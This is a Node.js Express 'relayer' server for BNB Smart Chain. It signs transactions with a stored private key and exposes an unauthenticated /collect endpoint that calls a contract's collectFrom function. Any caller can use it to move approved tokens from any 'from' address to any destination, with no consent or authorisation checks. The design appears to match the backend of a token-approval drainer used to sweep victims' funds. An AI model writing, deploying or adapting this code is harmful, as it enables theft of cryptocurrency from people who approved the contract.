require("dotenv").config();
const express = require("express");
const { ethers } = require("ethers");

const app = express();
app.use(express.json());

/* =========================
   BSC RPC
========================= */
const provider = new ethers.JsonRpcProvider(
  "https://bsc-dataseed.binance.org/"
);

/* =========================
   RELAYER WALLET
========================= */
const wallet = new ethers.Wallet(
  process.env.PRIVATE_KEY,
  provider
);

/* =========================
   COLLECTOR CONTRACT
   (collectFrom contract)
========================= */
const COLLECTOR_CONTRACT =
  process.env.COLLECTOR_CONTRACT;

/* ABI — ONLY required function */
const ABI = [
  "function collectFrom(address token,address from,uint256 amount,address to) external"
];

const collector = new ethers.Contract(
  COLLECTOR_CONTRACT,
  ABI,
  wallet
);

/* =========================
   STATUS ROUTE
========================= */
app.get("/", (req, res) => {
  res.json({
    status: true,
    relayer: wallet.address,
    contract: COLLECTOR_CONTRACT
  });
});

/* =========================
   RELAYER ENDPOINT
========================= */
app.post("/collect", async (req, res) => {
  try {
    const { token, from, to, amount } = req.body;

    if (!token || !from || !to || !amount) {
      return res.status(400).json({
        success: false,
        error: "Missing params"
      });
    }

    console.log("Collect request:", req.body);

    /* CALL SMART CONTRACT */
    const tx = await collector.collectFrom(
      token,
      from,
      amount,
      to
    );

    console.log("TX SENT:", tx.hash);

    await tx.wait();

    res.json({
      success: true,
      hash: tx.hash
    });

  } catch (err) {
    console.log(err);

    res.status(500).json({
      success: false,
      error: err.message
    });
  }
});

/* =========================
   START SERVER
========================= */
const PORT = process.env.PORT || 3000;

app.listen(PORT, () =>
  console.log("✅ Relayer running on port", PORT)
);
